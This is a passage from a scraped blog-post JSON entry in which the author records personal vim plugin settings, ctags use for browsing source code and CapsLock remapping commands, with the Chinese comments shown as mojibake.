\u0026#39;î‚°\u0026#39; let g:airline_left_alt_sep = \u0026#39;î‚±\u0026#39; let g:airline_right_sep = \u0026#39;î‚²\u0026#39; let g:airline_right_alt_sep = \u0026#39;î‚³\u0026#39; let g:airline_symbols.branch = \u0026#39;î‚ \u0026#39; let g:airline_symbols.readonly = \u0026#39;î‚¢\u0026#39; let g:airline_symbols.linenr = \u0026#39;î‚¡\u0026#39; let g:airline#extensions#tabline#enabled = 1 let g:airline#extensions#tabline#show_buffers = 0 let g:airline#extensions#tabline#show_tabs = 1 let g:airline#extensions#tabline#fnamemod = \u0026#39;:t\u0026#39; let g:airline#extensions#tabline#left_sep = \u0026#39; \u0026#39; let g:airline#extensions#tabline#left_alt_sep = \u0026#39;|\u0026#39; \u0026#34; \u0026#34; ä¸»é¢˜è®¾ç½® \u0026#34; color schema \u0026#34;ä¸»é¢˜è®¾ç½®ä¸ºå†°å±±ä¸»é¢˜ \u0026#34; colorscheme iceberg \u0026#34; let g:airline_theme=\u0026#39;iceberg\u0026#39; \u0026#34; let g:lightline = {\u0026#39;colorscheme\u0026#39;: \u0026#39;iceberg\u0026#39;} \u0026#34; \u0026#34; è®¾ç½®ä¸»é¢˜ä¸ºonedark colorscheme neodark ~/.vim/plugset/nerdcomment.vim \u0026#34; comment plugin setting \u0026#34;comment followed a space let g:NERDSpaceDelims=1 ~/.vim/plugset/autopair.vim \u0026#34; autopair setting let g:AutoPairsShortcutJump = \u0026#39;\u0026lt;S-Tab\u0026gt;\u0026#39; let g:AutoPairsShortcutFastWrap=\u0026#39;\u0026lt;C-z\u0026gt;\u0026#39; ~/.vim/plugset/nerdtree.vim \u0026#34; T æ‰“å¼€nerdreeçª—å£ï¼Œåœ¨å·¦ä¾§æ æ˜¾ç¤º map T :NERDTreeToggle\u0026lt;CR\u0026gt;\u0026lt;leader\u0026gt;l \u0026#34;close vim if the only window left open is a NERDTree autocmd bufenter * if (winnr(\u0026#34;$\u0026#34;) == 1 \u0026amp;\u0026amp; exists(\u0026#34;b:NERDTree\u0026#34;) \u0026amp;\u0026amp; b:NERDTree.isTabTree()) | q | endif ~/.vim/plugset/keysound.vim \u0026#34;launch with vim let g:keysound_enable = 1 \u0026#34;set default sound let g:keysound_theme = \u0026#39;default\u0026#39; \u0026#34; let g:keysound_theme = \u0026#39;typewriter\u0026#39; \u0026#34; let g:keysound_theme = \u0026#39;sword\u0026#39; \u0026#34; let g:keysound_theme = \u0026#39;mario\u0026#39; \u0026#34; let g:keysound_theme = \u0026#39;bubble\u0026#39; \u0026#34; set python version let g:keysound_py_version = 2 \u0026#34;volumn setting \u0026#34; å…¶å®è®¾ç½®è¿™ä¹ˆå¤§,æ—©å°±è¶…è¿‡æé™äº† let g:keysound_volumn = 100000 ~/.vim/plugset/taglists.vim map \u0026lt;leader\u0026gt;t :TlistToggle\u0026lt;CR\u0026gt; \u0026#34;è®¾ç½®å¬å”¤é”® let Tlist_WinWidth=30 \u0026#34;è®¾ç½®taglistå®½åº¦ let Tlist_Exit_OnlyWindow=1 \u0026#34;tagListçª—å£æ˜¯æœ€åä¸€ä¸ªçª—å£ï¼Œåˆ™é€€å‡ºVim let Tlist_Use_Right_Window = 0 \u0026#34; ä¸åŒæ—¶æ˜¾ç¤ºå¤šä¸ªæ–‡ä»¶çš„ tag ï¼Œåªæ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„ \u0026#34; let Tlist_Show_One_File=1 \u0026#34;è®©å½“å‰ä¸è¢«ç¼–è¾‘çš„æ–‡ä»¶çš„æ–¹æ³•åˆ—è¡¨è‡ªåŠ¨æŠ˜å èµ·æ¥ let Tlist_File_Fold_Auto_Close=1 ~/.vim/plugset/bookmark.vim let g:bookmark_sign = \u0026#39;\u0026gt;\u0026gt;\u0026#39; let g:bookmark_highlight_lines = 1 \u0026#34; unmap mp nmap mN \u0026lt;Plug\u0026gt;BookmarkPrev æºç å®¡è®¡ sudo apt install ctags #åˆ‡åˆ°å¾…å®¡è®¡æ–‡ä»¶å¤¹ä¸‹çš„æ ¹ç›®å½•ä¸‹,æ‰§è¡Œ ctags -R ç”Ÿæˆå…¨å±€çš„æ ‡ç­¾æ–‡ä»¶ ç„¶åæˆ‘ä»¬è¿›å…¥ä¸€ä¸ªä»£ç æ–‡ä»¶,å…‰æ ‡æ”¾åœ¨æŸä¸€ä¸ªå‡½æ•°åæˆ–è€…æ˜¯å®ä¸Š,æŒ‰ä¸‹Ctrl + ], vimå°±å¯ä»¥è‡ªåŠ¨åˆ‡æ¢åˆ°è¯¥å‡½æ•°å®šä¹‰å¤„,è¦è¿”å›åªéœ€è¦æŒ‰ä¸‹Ctrl + o æˆ–è€… Ctrl + t sudo apt-get install xcape # make CapsLock behave like Ctrl: setxkbmap -option ctrl:nocaps # make short-pressed Ctrl behave like Escape: xcape -e \u0026#39;Control_L=Escape\u0026#39; see the link below:\nhttp://tiborsimko.org/capslock-escape-control.html\nç”±äºè¿™æ ·çš„åšæ³•ä¼šè®©caplockååº”å˜æ…¢,å› æ­¤æˆ‘ä¸ç”¨è¿™ç§æ–¹æ³•,è€Œæ˜¯ä¼ ç»Ÿçš„ä¿®æ”¹keyboardæ–‡ä»¶æ¥è¾¾åˆ°ç®€å•çš„escæ˜ å°„æ•ˆæœ.\n","permalink":"https://dragonbox.top/posts/tech-ch4ser-vim/","summary":"\u003ch1 id=\"ch3n9w-çš„-vim\"\u003ech3n9w çš„ vim\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eæœ¬ç¯‡æ–‡ç« ä¸­çš„æ’ä»¶å‡å·²è¿‡æ—¶, ä¸æ¨èä½¿ç”¨\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eã€Šç¨‹åºå‘˜ä¿®ç‚¼ä¹‹é“ã€‹ä¸­æœ‰ä¸€å¥è¯:\u003ccode\u003eæœ€å¥½æ˜¯ç²¾é€šä¸€ç§ç¼–è¾‘å™¨ï¼Œå¹¶å°†å…¶ç”¨äºæ‰€æœ‰ç¼–è¾‘ä»»åŠ¡ã€‚å¦‚æœä¸åšæŒä½¿ç”¨ä¸€ç§ç¼–è¾‘å™¨ï¼Œå¯èƒ½ä¼šé¢ä¸´ç°ä»£çš„å·´åˆ«ç‰¹å¤§æ··ä¹±ã€‚\u003c/code\u003e ï¼Œå®è´¨ä»Šæ—¥ï¼Œæ·±ä»¥ä¸ºç„¶ã€‚è€Œè‡ªä»æ¥è§¦vimä¹‹åæˆ‘ä¸€ç›´éƒ½ä¿æŒç€æœ‰ç©ºæŠ˜è…¾æŠ˜è…¾çš„å¥½ä¹ æƒ¯ï¼Œå®ƒçš„ç®€æ´å’Œé«˜åº¦è‡ªç”±è®©äººç€è¿·ï¼Œå›´ç»•ç€vimè¡ç”Ÿå‡ºçš„æ’ä»¶æ•°ä¸èƒœæ•°ã€‚å¥ˆä½•æ’ä»¶ç¹å¤šçš„åŒæ—¶ä¹Ÿæ„å‘³ç€é€‰æ‹©çš„å›°éš¾å’Œé…ç½®çš„ç¹çã€‚ä¸ºäº†å‡†å¤‡ä»¥åå¯èƒ½å‡ºç°çš„çªå‘æƒ…å†µæ¯”å¦‚é…ç½®ä¸¢å¤±æˆ–è€…é‡æ–°å®‰è£…ï¼Œç‰¹åœ¨æ­¤ä»¥å®ç°ç‰¹å®šåŠŸèƒ½ä¸ºä¸»é¢˜ï¼Œè®°å½•è‡ªå·±é…ç½®vimçš„è¿‡ç¨‹ã€‚\u003c/p\u003e","title":"ch3n9w çš„ vim"}]